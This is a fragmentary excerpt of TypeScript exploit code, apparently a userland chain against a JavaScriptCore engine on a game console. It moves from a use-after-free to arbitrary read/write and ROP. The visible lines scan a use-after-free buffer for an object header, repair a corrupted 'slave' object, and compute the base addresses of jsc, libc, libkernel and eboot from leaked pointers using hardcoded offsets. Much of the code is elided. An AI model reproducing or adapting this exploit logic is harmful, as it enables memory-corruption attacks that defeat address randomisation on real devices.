...
// ===============================
//  Exported addresses (??? init)
// ===============================
export let jsc_addr: BigInt
export let libc_addr: BigInt
export let libkernel_addr: BigInt
export let eboot_addr: BigInt

// ===============================
//  init_userland: UAF ? ARW ? ROP ? syscalls
// ===============================
export function init_userland () {
  // needed for arw
  ...
  for (let i = 8; i < uaf_view.byteLength; i += 16) {
    if (
      uaf_view.getBigInt(i - 8, true).eq(indexing_header) &&
  ...
  for (let i = 0; i < u32_structs.length; i++) {
    ...
    // @ts-expect-error: create property on Uint32Array intentionally
  ...
  // Fix slave
  mem.view(slave_addr).setUint8(6, 0xA0, true)
  ...
  jsc_addr = native_executable_function.sub(0xC6380)
  ...
  libc_addr = strerror_addr.sub(0x40410)
  ...
  eboot_addr = native_invoke_addr.sub(0x39330)
  ...
  libkernel_addr = utils.base_addr(_error_addr)
